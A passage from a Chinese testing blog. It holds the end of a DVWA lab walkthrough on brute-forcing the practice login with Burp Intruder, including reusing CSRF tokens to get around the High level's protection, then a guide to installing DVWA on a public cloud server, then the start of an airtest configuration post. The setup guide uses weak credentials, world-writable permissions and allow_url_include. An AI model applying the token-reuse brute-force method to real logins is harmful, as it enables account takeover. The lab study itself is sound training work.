<p><img src="/aposts/b7636e10/image-20220127171112317.png" alt="image-20220127171112317"></p>
<h3 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h3><p>源码如下，Medium 级别的代码主要增加了 mysql_real_escape_string 函数，该函数会对字符串中的特殊符号进行转义，从而对用户输入的参数进行了简单的过滤。相比 low 级别的代码，当登录验证失败时界面将冻结 2 秒，从而影响了爆破操作的效率，不过如果是一个闲来无事并且很有耐心的白帽黑客，爆破出密码仍然是时间问题。</p>
<p><img src="/aposts/b7636e10/image-20220127170706740.png" alt="image-20220127170706740"></p>
<h3 id="攻击方式-1"><a href="#攻击方式-1" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>和 low 级别一样，还是用 Brup 抓包后爆破即可，只是因为每次测试都要等上 2 秒，需要等稍长的时间而已。</p>
<h2 id="安全等级为High"><a href="#安全等级为High" class="headerlink" title="安全等级为High"></a>安全等级为High</h2><p>开发者使用了 “CSRF” 的反伪造请求，有一个旧的说法表示这种保护可以阻止暴力攻击，但事实并非如此。这个级别也扩展了中等级别，在登录失败时等待，但这次是 2 到 4 秒之间的随机时间，这样做的目的是试图混淆任何时间预测。使用验证码表单可能会产生与 CSRF 令牌类似的效果。</p>
<h3 id="源码审计-1"><a href="#源码审计-1" class="headerlink" title="源码审计"></a>源码审计</h3><p>High 级别的代码使用了stripslashes 函数，进一步过滤输入的内容。同时使用了 Token 抵御 CSRF 攻击，在每次登录时网页会随机生成一个 user_token 参数，在用户提交用户名和密码时要对 token 进行检查再进行 sql 查询</p>
<p><img src="/aposts/b7636e10/image-20220127171703241.png" alt="image-20220127171703241"></p>
<h3 id="攻击方式-2"><a href="#攻击方式-2" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>在Brute Force中，用户名输入admin，密码输入1123（错误的密码），正确的密码是password，点击登录被Burp 拦截</p>
<p><img src="/aposts/b7636e10/image-20220127152224491.png" alt="image-20220127152224491"></p>
<p>被拦截的请求多个token</p>
<p><img src="/aposts/b7636e10/image-20220128114155998.png" alt="image-20220128114155998"></p>
<p>把拦截的请求发送到测试器</p>
<p><img src="/aposts/b7636e10/image-20220127152650009.png" alt="image-20220127152650009"></p>
<p>在测试器中，我把密码和token作为被攻击的参数，攻击类型需要改为<strong>Pitchfork</strong></p>
<p><img src="/aposts/b7636e10/image-20220128160535877.png" alt="image-20220128160535877"></p>
<h4 id="设置密码的规则"><a href="#设置密码的规则" class="headerlink" title="设置密码的规则"></a>设置密码的规则</h4><h5 id="Playloads设置"><a href="#Playloads设置" class="headerlink" title="Playloads设置"></a>Playloads设置</h5><p>和之前一样，载入密码字典</p>
<p><img src="/aposts/b7636e10/image-20220128115211854.png" alt="image-20220128115211854"></p>
<h4 id="token的设置"><a href="#token的设置" class="headerlink" title="token的设置"></a>token的设置</h4><h5 id="Playloads设置-1"><a href="#Playloads设置-1" class="headerlink" title="Playloads设置"></a>Playloads设置</h5><p>有效载荷类型为递归搜索</p>
<p><img src="/aposts/b7636e10/image-20220128115300062.png" alt="image-20220128115300062"></p>
<h5 id="Options的设置"><a href="#Options的设置" class="headerlink" title="Options的设置"></a>Options的设置</h5><p>线程数设置为1，这样就能每次只取一个token值</p>
<p><img src="/aposts/b7636e10/image-20220128115449383.png" alt="image-20220128115449383"></p>
<p>重定向设置为总是</p>
<p><img src="/aposts/b7636e10/image-20220128115631963.png" alt="image-20220128115631963"></p>
<p>Grep-Extract设置，在响应结果中提前token的值，如果响应是302就要重新获取请求或者拦截，点击token的值，分隔符自带填入进去</p>
<p><img src="/aposts/b7636e10/image-20220128154844054.png" alt="image-20220128154844054"></p>
<ul>
<li>点击ok后，发现递归搜索文本框中自带填入了规则值</li>
</ul>
<p><img src="/aposts/b7636e10/image-20220128155009012.png" alt="image-20220128155009012"></p>
<p>并在playloads初始化有效负载中填入token的值</p>
<p><img src="/aposts/b7636e10/image-20220128155121049.png" alt="image-20220128155121049"></p>
<p>完成这些，我们就可以开始攻击了，按start attack</p>
<p><img src="/aposts/b7636e10/image-20220128160644340.png" alt="image-20220128160644340"></p>
<p>测试完成后，查看结果</p>
<p><img src="/aposts/b7636e10/image-20220128160432361.png" alt="image-20220128160432361"></p>
<h2 id="安全等级为Impossible"><a href="#安全等级为Impossible" class="headerlink" title="安全等级为Impossible"></a>安全等级为Impossible</h2><p><img src="/aposts/b7636e10/image-20220128161118392.png" alt="image-20220128161118392"></p>
<p>暴力（和用户枚举）不应该在该级别的代码上实现，开发人员增加了一个“锁定”功能，如果在过去 15 分钟内有5次错误登录，被锁定的用户将无法登录。</p>
<h3 id="源码审计-2"><a href="#源码审计-2" class="headerlink" title="源码审计"></a>源码审计</h3><p><img src="/aposts/b7636e10/image-20220128161334594.png" alt="image-20220128161334594"></p>
<h2 id="总结与防御"><a href="#总结与防御" class="headerlink" title="总结与防御"></a>总结与防御</h2><ul>
<li>由于服务器没有对用户的输入次数进行限制，导致攻击者可以利用爆破的手段来进行攻击，通过穷举法将用户名、密码等信息爆出来。当攻击者结合社会工程学生成了庞大的字典时，爆破攻击的可能性将会被增大。对于爆破漏洞，开发者可以对用户的登陆次数设置阈值，当某用户名表示的用户的登录次数在一定时间内超过阈值时，就暂时锁定用户。也可以进行 IP 检测，如果某个 IP 的登录次数超过阈值也可以锁定 IP。当然还有一种我们熟悉的方式，就是设置只有人可以通过验证的验证码或者是其他的验证手法，来保证进行登录操作的是人而不是机器。</li>
<li>Burp的字典爆破可以一站式爆出结果，很方便，但是字典攻击一般很耗时，穷举的爆破一般渗透中不是上选，而且这种爆破手段对字典有要求，理论上时间充足的话足够优秀的字典无敌。但是可惜实战中不会用那么多时间，<strong>如果登录次数错误有限制以及验证码等一些列措施，并不适合此方式</strong></li>
<li>本文主要来自<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45808483/article/details/121385412">DVWA通关详解</a>和<a target="_blank" rel="noopener" href="https://www.cnblogs.com/linfangnan/p/13652761.html">DVWA 通关指南：Brute Force (爆破)</a></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://louis-me.github.io/aposts/97835086/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="一个正经的测试工程师">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="施坤的博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/aposts/97835086/" class="post-title-link" itemprop="url">安全测试-搭建漏洞环境</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-01-25 17:30:30" itemprop="dateCreated datePublished" datetime="2022-01-25T17:30:30+08:00">2022-01-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-25 11:20:56" itemprop="dateModified" datetime="2022-02-25T11:20:56+08:00">2022-02-25</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">安全测试</span></a>
                </span>
            </span>

          
            <span id="/aposts/97835086/" class="post-meta-item leancloud_visitors" data-flag-title="安全测试-搭建漏洞环境" title="阅读次数">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/aposts/97835086/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/aposts/97835086/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="DVWA简介"><a href="#DVWA简介" class="headerlink" title="DVWA简介"></a>DVWA简介</h1><p>DVWA（Damn Vulnerable Web App）是一个基于PHP&#x2F;MySql搭建的Web应用程序，旨在为安全专业人员测试自己的专业技能和工具提供合法的 环境，帮助Web开发者更好的理解Web应用安全防范的过程。DVWA一共包含十个模块分别是：</p>
<ul>
<li><p>Bruce Force &#x2F;&#x2F;暴力破解</p>
</li>
<li><p>Command Injection &#x2F;&#x2F;命令注入</p>
</li>
<li><p>CSRF &#x2F;&#x2F;跨站请求伪造</p>
</li>
<li><p>File Inclusion &#x2F;&#x2F;文件包含</p>
</li>
<li><p>File Upload &#x2F;&#x2F;文件上传漏洞</p>
</li>
<li><p>Insecure CAPTCHA &#x2F;&#x2F;不安全的验证</p>
</li>
<li><p>SQL Injection &#x2F;&#x2F;sql注入</p>
</li>
<li><p>SQL Injection（Blind） &#x2F;&#x2F;sql注入（盲注）</p>
</li>
<li><p>XSS（Reflected） &#x2F;&#x2F;反射型XSS</p>
</li>
<li><p>XSS（Stored） &#x2F;&#x2F;存储型XSS</p>
</li>
</ul>
<p>同时每个模块的代码都有4种安全等级：Low、Medium、High、Impossible。通过从低难度到高难度的测试并参考代码变化可帮助学习者更快的理解漏洞的原理。</p>
<h1 id="DVWA的搭建"><a href="#DVWA的搭建" class="headerlink" title="DVWA的搭建"></a>DVWA的搭建</h1><ul>
<li>DVWA是由PHP代码开发的，可以采用更简单的搭建方式，就是用<a target="_blank" rel="noopener" href="https://sourceforge.net/projects/xampp/">xampp</a></li>
<li>我本次搭建到腾讯云服务器上，采用手动安装服务的方式，并不安装mariadb和mariadb-server，因为我服务器已经安装了mysql</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install php php-mysql php-gd  httpd -y</span><br></pre></td></tr></table></figure>

<ul>
<li>下载最新的DVWA并解压</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-24-13-centos local]# wget https://codeload.github.com/digininja/DVWA/zip/refs/tags/2.0.1</span><br><span class="line">[root@VM-24-13-centos local]# unzip 2.0.1 -d  dvwa</span><br><span class="line">[root@VM-24-13-centos local]# cd  dvwa</span><br><span class="line">[root@VM-24-13-centos dvwa]# ll</span><br><span class="line">total 4</span><br><span class="line">drwxr-xr-x 10 root root 4096 Sep  1  2020 DVWA-2.0.1</span><br><span class="line">[root@VM-24-13-centos dvwa]# cd DVWA-2.0.1/</span><br><span class="line">[root@VM-24-13-centos DVWA-2.0.1]# ll</span><br><span class="line">total 148</span><br><span class="line">-rw-r--r--  1 root root  3415 Sep  1  2020 about.php</span><br><span class="line">-rw-r--r--  1 root root  7296 Sep  1  2020 CHANGELOG.md</span><br><span class="line">drwxr-xr-x  2 root root  4096 Sep  1  2020 config</span><br><span class="line">-rw-r--r--  1 root root 33107 Sep  1  2020 COPYING.txt</span><br><span class="line">drwxr-xr-x  2 root root  4096 Sep  1  2020 docs</span><br><span class="line">drwxr-xr-x  6 root root  4096 Sep  1  2020 dvwa</span><br><span class="line">drwxr-xr-x  4 root root  4096 Sep  1  2020 external</span><br><span class="line">-rw-r--r--  1 root root  1406 Sep  1  2020 favicon.ico</span><br><span class="line">drwxr-xr-x  5 root root  4096 Sep  1  2020 hackable</span><br><span class="line">-rw-r--r--  1 root root   895 Sep  1  2020 ids_log.php</span><br><span class="line">-rw-r--r--  1 root root  4393 Sep  1  2020 index.php</span><br><span class="line">-rw-r--r--  1 root root  1869 Sep  1  2020 instructions.php</span><br><span class="line">-rw-r--r--  1 root root  4183 Sep  1  2020 login.php</span><br><span class="line">-rw-r--r--  1 root root   414 Sep  1  2020 logout.php</span><br><span class="line">-rw-r--r--  1 root root   199 Sep  1  2020 phpinfo.php</span><br><span class="line">-rw-r--r--  1 root root   154 Sep  1  2020 php.ini</span><br><span class="line">-rw-r--r--  1 root root 15490 Sep  1  2020 README.md</span><br><span class="line">-rw-r--r--  1 root root    26 Sep  1  2020 robots.txt</span><br><span class="line">-rw-r--r--  1 root root  4724 Sep  1  2020 security.php</span><br><span class="line">-rw-r--r--  1 root root  3063 Sep  1  2020 setup.php</span><br><span class="line">drwxr-xr-x  2 root root  4096 Sep  1  2020 tests</span><br><span class="line">drwxr-xr-x 16 root root  4096 Sep  1  2020 vulnerabilities</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>开启服务</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start  httpd </span><br></pre></td></tr></table></figure>

<ul>
<li>移动到apache根目录下</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-24-13-centos dvwa]# cp -r DVWA-2.0.1/ /var/www/html/</span><br></pre></td></tr></table></figure>

<ul>
<li>配置文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-24-13-centos config]# pwd</span><br><span class="line">/var/www/html/DVWA-2.0.1/config</span><br><span class="line"></span><br><span class="line">[root@VM-24-13-centos config]# cp config.inc.php.dist config.inc.php</span><br><span class="line"></span><br><span class="line">[root@VM-24-13-centos config]#  vi config.inc.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_DVWA = array();</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_DVWA[ <span class="string">&#x27;db_server&#x27;</span> ]   = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_DVWA[ <span class="string">&#x27;db_database&#x27;</span> ] = <span class="string">&#x27;dvwa&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_DVWA[ <span class="string">&#x27;db_user&#x27;</span> ]     = <span class="string">&#x27;dvwa&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_DVWA[ <span class="string">&#x27;db_password&#x27;</span> ] = <span class="string">&#x27;dvwa1234&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_DVWA[ <span class="string">&#x27;db_port &#x27;</span>] = <span class="string">&#x27;3306&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_DVWA[ <span class="string">&#x27;recaptcha_public_key&#x27;</span> ]  = <span class="string">&#x27;XXXXXAAAKPoVVMvbWSGeo4rm0D-Ev5TKSTr&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_DVWA[ <span class="string">&#x27;recaptcha_private_key&#x27;</span> ] = <span class="string">&#x27;XXXXAJfPh10KQCdJZizM0yfmQTHQjA3y&#x27;</span>;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>recaptcha_public_key和recaptcha_private_key 的生成</li>
<li>打开<a target="_blank" rel="noopener" href="https://www.google.com/recaptcha/admin%E8%BF%9B%E8%A1%8C%E5%88%9B%E5%BB%BA">https://www.google.com/recaptcha/admin进行创建</a></li>
</ul>
<p><img src="/aposts/97835086/image-20220126100635195.png" alt="image-20220126100635195"></p>
<p><img src="/aposts/97835086/image-20220126100827029.png" alt="image-20220126100827029"></p>
<ul>
<li>创建数据库</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-24-13-centos config]# mysql -u root -p</span><br><span class="line">mysql&gt; create database dvwa;</span><br><span class="line">mysql&gt;use dvwa;</span><br><span class="line">mysql&gt; set global validate_password.policy=&#x27;LOW&#x27;; # mysql8后，有密码策略要求，改为低</span><br><span class="line">mysql &gt;create user &#x27;dvwa&#x27;@&#x27;%&#x27; identified by &#x27;dvwa1234&#x27;; # 创建用户和密码</span><br><span class="line">mysql&gt;use mysql;</span><br><span class="line">mysql&gt; select host, user, authentication_string, plugin from user;</span><br><span class="line">+-----------+------------------+------------------------------------------------------------------------+-----------------------+</span><br><span class="line">| host      | user             | authentication_string                                                  | plugin                |</span><br><span class="line">+-----------+------------------+------------------------------------------------------------------------+-----------------------+</span><br><span class="line">X3%         | dvwa             | $A$005$6?yx</span><br><span class="line"></span><br><span class="line">mysql&gt;use dvwa;</span><br><span class="line">mysql&gt; grant all privileges on dvwa.* to &#x27;dvwa&#x27;@&#x27;%&#x27;; # 授权数据库给用户</span><br><span class="line">mysql&gt;flush privileges;</span><br><span class="line">mysql&gt;exit;</span><br><span class="line"></span><br><span class="line"># 登录成功</span><br><span class="line">mysql -u dvwa -p</span><br></pre></td></tr></table></figure>

<ul>
<li>80端口腾讯云在规则中已经默认打开，设置下防火墙</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 开启防火墙</span><br><span class="line">systemctl start firewalld</span><br><span class="line"># 防火墙打开80端口</span><br><span class="line">[root@VM-24-13-centos config]# firewall-cmd --zone=public --add-port=80/tcp --permane</span><br><span class="line"># 重启httpd服务</span><br><span class="line">service httpd restart</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>用外网ip打开安装目录</li>
</ul>
<p><img src="/aposts/97835086/image-20220126150340578.png" alt="image-20220126150340578"></p>
<ul>
<li>出现一些红色错误，一个个来解决</li>
</ul>
<p><img src="/aposts/97835086/image-20220126151224710.png" alt="image-20220126151224710"></p>
<ul>
<li>设置php.ini</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/php.ini</span><br><span class="line"></span><br><span class="line">allow_url_fopen = On</span><br><span class="line">allow_url_include = On</span><br></pre></td></tr></table></figure>

<ul>
<li>设置权限</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-24-13-centos hackable]# pwd</span><br><span class="line">/var/www/html/DVWA-2.0.1/hackable</span><br><span class="line"></span><br><span class="line">[root@VM-24-13-centos hackable]# chmod 777 uploads</span><br><span class="line">[root@VM-24-13-centos DVWA-2.0.1]# chmod 777 external/phpids/0.6/lib/IDS/tmp/phpids_log.txt</span><br><span class="line"></span><br><span class="line">[root@VM-24-13-centos DVWA-2.0.1]# chmod 7777 config/</span><br><span class="line"># 重启httpd服务</span><br><span class="line">service httpd restart</span><br></pre></td></tr></table></figure>

<ul>
<li>出现加密的插件不存在</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p</span><br><span class="line">set global validate_password.policy=&#x27;LOW&#x27;</span><br><span class="line">ALTER USER &#x27;dvwa&#x27;@&#x27;%&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;dvwa1234&#x27;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>

<ul>
<li>再次打开页面，就可以了，点击登录，用户名和密码为：admin&#x2F;password</li>
</ul>
<p><img src="/aposts/97835086/image-20220126152915786.png" alt="image-20220126152915786"></p>
<p><img src="/aposts/97835086/image-20220126153115113.png" alt="image-20220126153115113"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://louis-me.github.io/aposts/5a751e2b/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="一个正经的测试工程师">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="施坤的博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/aposts/5a751e2b/" class="post-title-link" itemprop="url">airtest多机并行设计解析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-01-21 11:38:57" itemprop="dateCreated datePublished" datetime="2022-01-21T11:38:57+08:00">2022-01-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-25 11:20:56" itemprop="dateModified" datetime="2022-02-25T11:20:56+08:00">2022-02-25</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">自动化测试</span></a>
                </span>
            </span>

          
            <span id="/aposts/5a751e2b/" class="post-meta-item leancloud_visitors" data-flag-title="airtest多机并行设计解析" title="阅读次数">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/aposts/5a751e2b/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/aposts/5a751e2b/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>前文介绍了<a target="_blank" rel="noopener" href="https://moon-full.gitee.io/2022/01/18/aritest%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E8%AE%BE%E8%AE%A1/">aritest自动化测试框架设计</a>，这次分析下如何设计多机并行，本次测试是安卓手机，雷电模拟器和真机，谷歌浏览器</p>
<h2 id="多机安卓"><a href="#多机安卓" class="headerlink" title="多机安卓"></a>多机安卓</h2><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><ul>
<li><p>setting.yml</p>
</li>
<li><p>和前文配置差不多，加了个<code>boot=multi</code></p>
<ul>
<li><p>只要设置此指，就会读取下面的值，里面给不同设备指定了不同模块</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">multi</span>]</span><br><span class="line"><span class="string">test_case</span> <span class="string">=</span> [&#123;<span class="string">&quot;dev&quot;</span><span class="string">:&quot;ZL9LC685V86DNNMN&quot;</span>,<span class="attr">&quot;test_module&quot;:</span> [<span class="string">&quot;我的&quot;</span>],<span class="string">&quot;phone&quot;</span><span class="string">:&quot;真机1&quot;</span>&#125;, &#123;<span class="string">&quot;dev&quot;</span><span class="string">:&quot;emulator-5554&quot;</span>,<span class="string">&quot;test_module&quot;</span><span class="string">:</span>[<span class="string">&quot;他的&quot;</span>],<span class="string">&quot;phone&quot;</span><span class="string">:&quot;雷电&quot;</span>&#125;]</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">default</span>]</span><br><span class="line"><span class="comment"># 包名</span></span><br><span class="line"><span class="string">pkg</span> <span class="string">=</span> <span class="string">com.jianshu.haruki</span></span><br><span class="line"><span class="comment"># 手机名字</span></span><br><span class="line"><span class="string">phone=雷电模拟器</span></span><br><span class="line"><span class="comment"># 设备连接名字</span></span><br><span class="line"><span class="string">dev_connect=Android://127.0.0.1:5037/</span></span><br><span class="line"><span class="comment"># 设备id,adb devices 获取，如果启动多设备，这里无效</span></span><br><span class="line"><span class="string">dev=emulator-5554</span></span><br><span class="line"><span class="comment"># 用例目录</span></span><br><span class="line"><span class="string">root_path=E:\proj\airtest_auto\air_case\android</span></span><br><span class="line"> <span class="comment"># test_plan=1 表示调试用例需要配合test_module使用，0表示全部用例;如果启动多设备,test_plan默认为0,设置1也无效</span></span><br><span class="line"><span class="string">test_plan=1</span></span><br><span class="line"><span class="string">test_module=[&quot;他的&quot;]</span></span><br><span class="line"><span class="comment"># false|true 表示是否运行用例之前，删除log文件夹，删除后会影响查看历史报告</span></span><br><span class="line"><span class="string">remove_log=true</span></span><br><span class="line"><span class="comment"># false|true 是否开启录屏,若传true就会自动录屏，但是在模拟器上录屏失败，只使用于真机</span></span><br><span class="line"><span class="string">recording=false</span></span><br><span class="line"><span class="comment"># android|ios|web，当填如web时，需要填写驱动文件位置</span></span><br><span class="line"><span class="string">platform</span> <span class="string">=android</span></span><br><span class="line"><span class="comment"># driver_path=E:\proj\airtest_auto\exe\chromedriver.exe</span></span><br><span class="line"><span class="string">driver_path=</span></span><br><span class="line"><span class="comment"># 服务器信的信息，比如本地的ip，用来展示报告</span></span><br><span class="line"><span class="string">report_host=172.31.105.196</span></span><br><span class="line"><span class="comment"># 本地服务器路径，我把源代码中的report也放在里面了</span></span><br><span class="line"><span class="string">local_host_path=E:\proj\aritest</span></span><br><span class="line"><span class="comment"># 本地服务器端口</span></span><br><span class="line"><span class="string">local_host_port=8000</span></span><br><span class="line"><span class="comment"># 启动什么模式，单机和多机</span></span><br><span class="line"><span class="comment"># 如果指定multi就是多机并行，读取multi的配置，否则就为单机模式</span></span><br><span class="line"><span class="string">boot=multi</span></span><br><span class="line">[<span class="string">multi</span>]</span><br><span class="line"><span class="comment"># 给不同的设备分配测试模块,dev中的设备id一定要填对</span></span><br><span class="line"><span class="string">test_case</span> <span class="string">=</span> [&#123;<span class="string">&quot;dev&quot;</span><span class="string">:&quot;ZL9LC685V86DNNMN&quot;</span>,<span class="attr">&quot;test_module&quot;:</span> [<span class="string">&quot;我的&quot;</span>],<span class="string">&quot;phone&quot;</span><span 